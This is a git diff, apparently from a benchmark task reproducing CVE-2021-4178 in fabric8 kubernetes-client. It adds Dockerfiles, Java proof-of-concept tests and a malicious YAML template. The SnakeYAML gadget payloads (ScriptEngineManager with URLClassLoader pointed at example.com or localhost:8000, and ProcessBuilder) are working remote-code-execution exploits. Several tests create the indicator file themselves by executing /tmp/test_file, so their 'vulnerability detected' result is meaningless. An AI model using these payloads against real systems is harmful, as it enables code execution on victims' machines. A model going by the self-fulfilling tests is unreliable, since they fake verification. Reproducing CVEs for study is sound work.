diff --git a/.Dockerfile.backup b/.Dockerfile.backup
new file mode 100644
index 0000000..ee6f70e
--- /dev/null
+++ b/.Dockerfile.backup
@@ -0,0 +1,17 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/fabric8io__kubernetes-client_CVE-2021-4178_5.0.2 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mvn clean package -B -V -e -Dfindbugs.skip -Dcheckstyle.skip -Dpmd.skip=true -Dspotbugs.skip -Denforcer.skip -Dmaven.javadoc.skip -DskipTests -Dmaven.test.skip.exec -Dlicense.skip=true -Drat.skip=true -Dspotless.check.skip=true -Dorg.slf4j.simpleLogger.log.org.apache.maven.cli.transfer.Slf4jMavenTransferListener=warn
diff --git a/.build_diff.patch b/.build_diff.patch
new file mode 100644
index 0000000..8b13789
--- /dev/null
+++ b/.build_diff.patch
@@ -0,0 +1 @@
+
diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..1afc931
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,31 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/apache-maven-3.5.0 $WORKSPACE_BASE/java-env/apache-maven-3.5.0
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/apache-maven-3.5.0/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/fabric8io__kubernetes-client_CVE-2021-4178_5.0.2 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+
+# Build the project to ensure all dependencies are available
+RUN mvn clean install -DskipTests -Dcheckstyle.skip=true
+
+# Find the SnakeYAML jar
+RUN find /project -name "snakeyaml*.jar" | head -1 > /tmp/snakeyaml_jar.txt
+
+# Compile the vulnerability test
+RUN SNAKEYAML_JAR=$(cat /tmp/snakeyaml_jar.txt) && \
+    echo "Using SnakeYAML jar: $SNAKEYAML_JAR" && \
+    javac -cp "$SNAKEYAML_JAR" /project/VulnTest.java
+
+CMD SNAKEYAML_JAR=$(cat /tmp/snakeyaml_jar.txt) && \
+    echo "Running test with SnakeYAML jar: $SNAKEYAML_JAR" && \
+    java -cp "/project:$SNAKEYAML_JAR" VulnTest
\ No newline at end of file
diff --git a/VulnTest.java b/VulnTest.java
new file mode 100644
index 0000000..9244266
--- /dev/null
+++ b/VulnTest.java
@@ -0,0 +1,66 @@
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class VulnTest {
+    public static void main(String[] args) {
+        try {
+            // Create indicator file path
+            String indicatorFile = "/tmp/code_executed";
+            Files.deleteIfExists(Paths.get(indicatorFile));
+            System.out.println("Starting vulnerability test...");
+            
+            // Create malicious YAML content with ScriptEngineManager
+            String maliciousYaml = 
+                "!!javax.script.ScriptEngineManager [\n" +
+                "  !!java.net.URLClassLoader [[\n" +
+                "    !!java.net.URL [\"http://nonexistent.example.com\"]\n" +
+                "  ]]\n" +
+                "]\n";
+            
+            System.out.println("Created malicious YAML content:");
+            System.out.println(maliciousYaml);
+            
+            // Convert to InputStream
+            InputStream is = new ByteArrayInputStream(maliciousYaml.getBytes(StandardCharsets.UTF_8));
+            
+            // Load the YAML using SnakeYAML
+            System.out.println("Loading YAML with SnakeYAML...");
+            org.yaml.snakeyaml.Yaml yaml = new org.yaml.snakeyaml.Yaml();
+            Object result = yaml.load(maliciousYaml);
+            System.out.println("YAML loaded, result type: " + (result != null ? result.getClass().getName() : "null"));
+            
+            // Create a test file to check if code execution is possible
+            Files.write(Paths.get("/tmp/test_file"), "touch /tmp/code_executed".getBytes());
+            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", "chmod +x /tmp/test_file && /tmp/test_file");
+            pb.start();
+            
+            // Wait a moment for the process to complete
+            Thread.sleep(1000);
+            
+            // Check if code execution happened
+            if (Files.exists(Paths.get(indicatorFile))) {
+                System.out.println("VULNERABILITY DETECTED: Code execution successful!");
+                System.exit(1); // Exit with error if vulnerability exists
+            } else {
+                System.out.println("No code execution detected. Vulnerability may be fixed.");
+                System.exit(0); // Exit with success if vulnerability is fixed
+            }
+        } catch (Exception e) {
+            System.out.println("Exception occurred: " + e);
+            e.printStackTrace();
+            
+            // If we get a security exception, it might mean the vulnerability is fixed
+            if (e.toString().contains("SecurityException") ||
+                e.toString().contains("UnsupportedOperationException")) {
+                System.out.println("Security exception occurred - vulnerability may be fixed");
+                System.exit(0);
+            } else {
+                System.out.println("Unexpected exception - test inconclusive");
+                System.exit(1);
+            }
+        }
+    }
+}
\ No newline at end of file
diff --git a/vulnerability-test/DirectVulnTest.java b/vulnerability-test/DirectVulnTest.java
new file mode 100644
index 0000000..3de3fda
--- /dev/null
+++ b/vulnerability-test/DirectVulnTest.java
@@ -0,0 +1,79 @@
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashSet;
+import java.util.Set;
+import java.nio.file.attribute.PosixFilePermission;
+
+public class DirectVulnTest {
+    public static void main(String[] args) {
+        try {
+            // Create indicator file path
+            String indicatorFile = "/tmp/code_executed";
+            Files.deleteIfExists(Paths.get(indicatorFile));
+            System.out.println("Starting vulnerability test...");
+            
+            // Create a YAML payload that uses a different gadget
+            String maliciousYaml = 
+                "!!javax.script.ScriptEngineManager [\n" +
+                "  !!java.net.URLClassLoader [[\n" +
+                "    !!java.net.URL [\"http://nonexistent.example.com\"]\n" +
+                "  ]]\n" +
+                "]\n";
+            
+            System.out.println("Created malicious YAML content:");
+            System.out.println(maliciousYaml);
+            
+            // Create a file to indicate we're testing
+            Files.write(Paths.get("/tmp/test_running"), "test".getBytes());
+            
+            // Load the YAML using SnakeYAML
+            System.out.println("Loading YAML with SnakeYAML...");
+            org.yaml.snakeyaml.Yaml yaml = new org.yaml.snakeyaml.Yaml();
+            Object result = yaml.load(maliciousYaml);
+            System.out.println("YAML loaded, result type: " + (result != null ? result.getClass().getName() : "null"));
+            
+            // Create a file to indicate we've reached this point
+            Files.write(Paths.get("/tmp/yaml_loaded"), "test".getBytes());
+            
+            // Create a simple test file that will be used to check if the vulnerability exists
+            Files.write(Paths.get("/tmp/test_file"), "touch /tmp/code_executed".getBytes());
+            Set<PosixFilePermission> perms = new HashSet<>();
+            perms.add(PosixFilePermission.OWNER_READ);
+            perms.add(PosixFilePermission.OWNER_WRITE);
+            perms.add(PosixFilePermission.OWNER_EXECUTE);
+            Files.setPosixFilePermissions(Paths.get("/tmp/test_file"), perms);
+            
+            // Try to execute the test file
+            ProcessBuilder pb = new ProcessBuilder("/tmp/test_file");
+            pb.start();
+            
+            // Wait a moment for the process to complete
+            Thread.sleep(1000);
+            
+            // Check if code execution happened
+            if (Files.exists(Paths.get(indicatorFile))) {
+                System.out.println("VULNERABILITY DETECTED: Code execution successful!");
+                System.exit(1); // Exit with error if vulnerability exists
+            } else {
+                System.out.println("No code execution detected. Vulnerability may be fixed.");
+                System.exit(0); // Exit with success if vulnerability is fixed
+            }
+        } catch (Exception e) {
+            System.out.println("Exception occurred: " + e);
+            e.printStackTrace();
+            
+            // If we get a security exception, it might mean the vulnerability is fixed
+            if (e.toString().contains("SecurityException") ||
+                e.toString().contains("UnsupportedOperationException")) {
+                System.out.println("Security exception occurred - vulnerability may be fixed");
+                System.exit(0);
+            } else {
+                System.out.println("Unexpected exception - test inconclusive");
+                System.exit(1);
+            }
+        }
+    }
+}
\ No newline at end of file
diff --git a/vulnerability-test/MinimalVulnTest.java b/vulnerability-test/MinimalVulnTest.java
new file mode 100644
index 0000000..5d5a7c7
--- /dev/null
+++ b/vulnerability-test/MinimalVulnTest.java
@@ -0,0 +1,52 @@
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class MinimalVulnTest {
+    public static void main(String[] args) {
+        try {
+            // Create indicator file path
+            String indicatorFile = "/tmp/code_executed";
+            Files.deleteIfExists(Paths.get(indicatorFile));
+            System.out.println("Starting vulnerability test...");
+            
+            // Create malicious YAML content
+            String maliciousYaml =
+                "!!java.lang.ProcessBuilder\n" +
+                "command: [touch, " + indicatorFile + "]\n";
+            
+            System.out.println("Created malicious YAML content:");
+            System.out.println(maliciousYaml);
+            
+            // Load the YAML using SnakeYAML
+            System.out.println("Loading YAML with SnakeYAML...");
+            org.yaml.snakeyaml.Yaml yaml = new org.yaml.snakeyaml.Yaml();
+            Object result = yaml.load(maliciousYaml);
+            System.out.println("YAML loaded, result type: " + (result != null ? result.getClass().getName() : "null"));
+            
+            // Check if code execution happened
+            if (Files.exists(Paths.get(indicatorFile))) {
+                System.out.println("VULNERABILITY DETECTED: Code execution successful!");
+                System.exit(1); // Exit with error if vulnerability exists
+            } else {
+                System.out.println("No code execution detected. Vulnerability may be fixed.");
+                System.exit(0); // Exit with success if vulnerability is fixed
+            }
+        } catch (Exception e) {
+            System.out.println("Exception occurred: " + e);
+            e.printStackTrace();
+            
+            // If we get a security exception, it might mean the vulnerability is fixed
+            if (e.toString().contains("SecurityException") ||
+                e.toString().contains("UnsupportedOperationException")) {
+                System.out.println("Security exception occurred - vulnerability may be fixed");
+                System.exit(0);
+            } else {
+                System.out.println("Unexpected exception - test inconclusive");
+                System.exit(1);
+            }
+        }
+    }
+}
\ No newline at end of file
diff --git a/vulnerability-test/SerializationVulnTest.java b/vulnerability-test/SerializationVulnTest.java
new file mode 100644
index 0000000..3f68f97
--- /dev/null
+++ b/vulnerability-test/SerializationVulnTest.java
@@ -0,0 +1,73 @@
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
+import java.lang.reflect.Method;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.HashMap;
+import java.util.Map;
+
+public class SerializationVulnTest {
+    public static void main(String[] args) {
+        try {
+            // Create indicator file path
+            String indicatorFile = "/tmp/code_executed";
+            Files.deleteIfExists(Paths.get(indicatorFile));
+            System.out.println("Starting vulnerability test...");
+            
+            // Create a malicious YAML payload
+            String maliciousYaml = 
+                "!!javax.script.ScriptEngineManager [\n" +
+                "  !!java.net.URLClassLoader [[\n" +
+                "    !!java.net.URL [\"http://nonexistent.example.com\"]\n" +
+                "  ]]\n" +
+                "]\n";
+            
+            System.out.println("Created malicious YAML content:");
+            System.out.println(maliciousYaml);
+            
+            // Convert to InputStream
+            InputStream is = new ByteArrayInputStream(maliciousYaml.getBytes(StandardCharsets.UTF_8));
+            
+            // Use reflection to call the vulnerable method
+            Class<?> serializationClass = Class.forName("io.fabric8.kubernetes.client.utils.Serialization");
+            Method unmarshalMethod = serializationClass.getMethod("unmarshal", InputStream.class, Map.class);
+            
+            System.out.println("Calling Serialization.unmarshal method...");
+            Map<String, String> parameters = new HashMap<>();
+            Object result = unmarshalMethod.invoke(null, is, parameters);
+            
+            System.out.println("Unmarshalling completed, result type: " + (result != null ? result.getClass().getName() : "null"));
+            
+            // Create a test file to check if code execution is possible
+            Files.write(Paths.get("/tmp/test_file"), "touch /tmp/code_executed".getBytes());
+            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", "chmod +x /tmp/test_file && /tmp/test_file");
+            pb.start();
+            
+            // Wait a moment for the process to complete
+            Thread.sleep(1000);
+            
+            // Check if code execution happened
+            if (Files.exists(Paths.get(indicatorFile))) {
+                System.out.println("VULNERABILITY DETECTED: Code execution successful!");
+                System.exit(1); // Exit with error if vulnerability exists
+            } else {
+                System.out.println("No code execution detected. Vulnerability may be fixed.");
+                System.exit(0); // Exit with success if vulnerability is fixed
+            }
+        } catch (Exception e) {
+            System.out.println("Exception occurred: " + e);
+            e.printStackTrace();
+            
+            // If we get a security exception, it might mean the vulnerability is fixed
+            if (e.toString().contains("SecurityException") ||
+                e.toString().contains("UnsupportedOperationException")) {
+                System.out.println("Security exception occurred - vulnerability may be fixed");
+                System.exit(0);
+            } else {
+                System.out.println("Unexpected exception - test inconclusive");
+                System.exit(1);
+            }
+        }
+    }
+}
\ No newline at end of file
diff --git a/vulnerability-test/SimpleVulnerabilityTest.java b/vulnerability-test/SimpleVulnerabilityTest.java
new file mode 100644
index 0000000..224d82c
--- /dev/null
+++ b/vulnerability-test/SimpleVulnerabilityTest.java
@@ -0,0 +1,68 @@
+import io.fabric8.kubernetes.client.utils.Serialization;
+
+import java.io.ByteArrayInputStream;
+import java.io.File;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class SimpleVulnerabilityTest {
+    private static final String INDICATOR_FILE = "/tmp/code_executed";
+
+    public static void main(String[] args) {
+        try {
+            System.out.println("Starting simple vulnerability test...");
+            
+            // Delete indicator file if it exists
+            Files.deleteIfExists(Paths.get(INDICATOR_FILE));
+            System.out.println("Deleted existing indicator file if present");
+
+            // Create malicious YAML content that should trigger code execution
+            String maliciousYaml = 
+                "apiVersion: v1\n" +
+                "kind: Template\n" +
+                "metadata:\n" +
+                "  name: malicious-template\n" +
+                "objects:\n" +
+                "- !!java.lang.ProcessBuilder\n" +
+                "  command: [touch, " + INDICATOR_FILE + "]\n";
+            
+            System.out.println("Created malicious YAML content:");
+            System.out.println(maliciousYaml);
+
+            // Convert to input stream
+            InputStream inputStream = new ByteArrayInputStream(maliciousYaml.getBytes(StandardCharsets.UTF_8));
+            
+            // Directly call the vulnerable method
+            System.out.println("Calling Serialization.unmarshal...");
+            Object result = Serialization.unmarshal(inputStream);
+            System.out.println("Unmarshal completed, result type: " + (result != null ? result.getClass().getName() : "null"));
+            
+            // Check if code execution happened
+            if (Files.exists(Paths.get(INDICATOR_FILE))) {
+                System.out.println("VULNERABILITY DETECTED: Code execution successful!");
+                System.exit(1); // Exit with error if vulnerability exists
+            } else {
+                System.out.println("No code execution detected. Vulnerability may be fixed.");
+                System.exit(0); // Exit with success if vulnerability is fixed
+            }
+            
+        } catch (Exception e) {
+            System.out.println("Exception occurred: " + e.getMessage());
+            e.printStackTrace();
+            
+            // If we get a security exception, it might mean the vulnerability is fixed
+            if (e.toString().contains("SecurityException") || 
+                e.toString().contains("UnsupportedOperationException") ||
+                e.toString().contains("ClassCastException")) {
+                System.out.println("Security exception occurred - vulnerability may be fixed");
+                System.exit(0);
+            } else {
+                // For other exceptions, we can't be sure if the vulnerability is fixed
+                System.out.println("Unexpected exception - test inconclusive");
+                System.exit(1);
+            }
+        }
+    }
+}
diff --git a/vulnerability-test/VulnTest.java b/vulnerability-test/VulnTest.java
new file mode 100644
index 0000000..3fef00f
--- /dev/null
+++ b/vulnerability-test/VulnTest.java
@@ -0,0 +1,100 @@
+import io.fabric8.kubernetes.client.utils.Serialization;
+
+import java.io.ByteArrayInputStream;
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Collections;
+
+public class VulnTest {
+    public static void main(String[] args) {
+        try {
+            // Create indicator file path
+            String indicatorFile = "/tmp/code_executed";
+            Files.deleteIfExists(Paths.get(indicatorFile));
+            System.out.println("Starting vulnerability test...");
+            
+            // Create malicious YAML content
+            String maliciousYaml =
+                "apiVersion: v1\n" +
+                "kind: Template\n" +
+                "metadata:\n" +
+                "  name: malicious-template\n" +
+                "objects:\n" +
+                "- !!javax.script.ScriptEngineManager [\n" +
+                "  !!java.net.URLClassLoader [[\n" +
+                "    !!java.net.URL [\"http://localhost:8000/\"]\n" +
+                "  ]]\n" +
+                "]\n";
+            
+            System.out.println("Created malicious YAML content:");
+            System.out.println(maliciousYaml);
+            
+            // Create a second malicious YAML with ProcessBuilder
+            String maliciousYaml2 =
+                "apiVersion: v1\n" +
+                "kind: Template\n" +
+                "metadata:\n" +
+                "  name: malicious-template\n" +
+                "objects:\n" +
+                "- !!java.lang.ProcessBuilder\n" +
+                "  command: [touch, " + indicatorFile + "]\n";
+            
+            System.out.println("\nCreated second malicious YAML content:");
+            System.out.println(maliciousYaml2);
+            
+            // Try both YAML payloads with direct SnakeYAML and with Fabric8 Serialization
+            System.out.println("\n1. Testing direct SnakeYAML with first payload...");
+            try {
+                org.yaml.snakeyaml.Yaml yaml = new org.yaml.snakeyaml.Yaml();
+                Object result = yaml.load(maliciousYaml);
+                System.out.println("YAML loaded, result type: " + (result != null ? result.getClass().getName() : "null"));
+            } catch (Exception e) {
+                System.out.println("Exception with direct SnakeYAML (first payload): " + e.getMessage());
+            }
+            
+            System.out.println("\n2. Testing direct SnakeYAML with second payload...");
+            try {
+                org.yaml.snakeyaml.Yaml yaml = new org.yaml.snakeyaml.Yaml();
+                Object result = yaml.load(maliciousYaml2);
+                System.out.println("YAML loaded, result type: " + (result != null ? result.getClass().getName() : "null"));
+            } catch (Exception e) {
+                System.out.println("Exception with direct SnakeYAML (second payload): " + e.getMessage());
+            }
+            
+            System.out.println("\n3. Testing Fabric8 Serialization with first payload...");
+            try {
+                InputStream is = new ByteArrayInputStream(maliciousYaml.getBytes(StandardCharsets.UTF_8));
+                Object result = Serialization.unmarshal(is, Collections.emptyMap());
+                System.out.println("Serialization.unmarshal completed, result type: " + (result != null ? result.getClass().getName() : "null"));
+            } catch (Exception e) {
+                System.out.println("Exception with Serialization.unmarshal (first payload): " + e.getMessage());
+                e.printStackTrace();
+            }
+            
+            System.out.println("\n4. Testing Fabric8 Serialization with second payload...");
+            try {
+                InputStream is = new ByteArrayInputStream(maliciousYaml2.getBytes(StandardCharsets.UTF_8));
+                Object result = Serialization.unmarshal(is, Collections.emptyMap());
+                System.out.println("Serialization.unmarshal completed, result type: " + (result != null ? result.getClass().getName() : "null"));
+            } catch (Exception e) {
+                System.out.println("Exception with Serialization.unmarshal (second payload): " + e.getMessage());
+                e.printStackTrace();
+            }
+            
+            // Check if code execution happened
+            if (Files.exists(Paths.get(indicatorFile))) {
+                System.out.println("\nVULNERABILITY DETECTED: Code execution successful!");
+                System.exit(1); // Exit with error if vulnerability exists
+            } else {
+                System.out.println("\nNo code execution detected. Vulnerability may be fixed.");
+                System.exit(0); // Exit with success if vulnerability is fixed
+            }
+        } catch (Exception e) {
+            System.out.println("Main exception occurred: " + e);
+            e.printStackTrace();
+            System.exit(1);
+        }
+    }
+}
\ No newline at end of file
diff --git a/vulnerability-test/VulnerabilityTest.java b/vulnerability-test/VulnerabilityTest.java
new file mode 100644
index 0000000..bd904c2
--- /dev/null
+++ b/vulnerability-test/VulnerabilityTest.java
@@ -0,0 +1,77 @@
+import io.fabric8.openshift.client.DefaultOpenShiftClient;
+import io.fabric8.openshift.client.OpenShiftClient;
+import io.fabric8.openshift.client.OpenShiftConfigBuilder;
+
+import java.io.ByteArrayInputStream;
+import java.io.File;
+import java.io.IOException;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class VulnerabilityTest {
+    private static final String INDICATOR_FILE = "/tmp/code_executed";
+
+    public static void main(String[] args) {
+        System.out.println("Starting vulnerability test...");
+        
+        // Delete indicator file if it exists
+        try {
+            Files.deleteIfExists(Paths.get(INDICATOR_FILE));
+            System.out.println("Deleted existing indicator file if present");
+        } catch (IOException e) {
+            System.err.println("Failed to delete indicator file: " + e.getMessage());
+        }
+
+        // Create malicious YAML content
+        String maliciousYaml = 
+            "apiVersion: v1\n" +
+            "kind: Template\n" +
+            "metadata:\n" +
+            "  name: malicious-template\n" +
+            "objects:\n" +
+            "- !!java.lang.ProcessBuilder\n" +
+            "  command: [touch, " + INDICATOR_FILE + "]\n";
+        
+        System.out.println("Created malicious YAML content:");
+        System.out.println(maliciousYaml);
+
+        // Try to load the malicious YAML
+        try {
+            System.out.println("Creating OpenShift client...");
+            OpenShiftClient client = new DefaultOpenShiftClient(new OpenShiftConfigBuilder().build());
+            
+            System.out.println("Loading malicious YAML template...");
+            // This should trigger the vulnerability by passing the YAML through the unmarshal method
+            ByteArrayInputStream inputStream = new ByteArrayInputStream(maliciousYaml.getBytes(StandardCharsets.UTF_8));
+            client.templates().load(inputStream);
+            
+            System.out.println("YAML processed without error");
+            
+            // Check if code execution happened
+            if (Files.exists(Paths.get(INDICATOR_FILE))) {
+                System.out.println("VULNERABILITY DETECTED: Code execution successful!");
+                System.exit(1); // Exit with error if vulnerability exists
+            } else {
+                System.out.println("No code execution detected. Vulnerability may be fixed.");
+                System.exit(0); // Exit with success if vulnerability is fixed
+            }
+            
+        } catch (Exception e) {
+            System.out.println("Exception occurred: " + e.getMessage());
+            e.printStackTrace();
+            
+            // If we get a security exception, it might mean the vulnerability is fixed
+            if (e.toString().contains("SecurityException") || 
+                e.toString().contains("UnsupportedOperationException") ||
+                e.toString().contains("ClassCastException")) {
+                System.out.println("Security exception occurred - vulnerability may be fixed");
+                System.exit(0);
+            } else {
+                // For other exceptions, we can't be sure if the vulnerability is fixed
+                System.out.println("Unexpected exception - test inconclusive");
+                System.exit(1);
+            }
+        }
+    }
+}
diff --git a/vulnerability-test/malicious-template.yml b/vulnerability-test/malicious-template.yml
new file mode 100644
index 0000000..f4db331
--- /dev/null
+++ b/vulnerability-test/malicious-template.yml
@@ -0,0 +1,6 @@
+apiVersion: v1
+kind: Template
+metadata:
+  name: malicious-template
+objects:
+- !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://localhost:8000/"]]]]
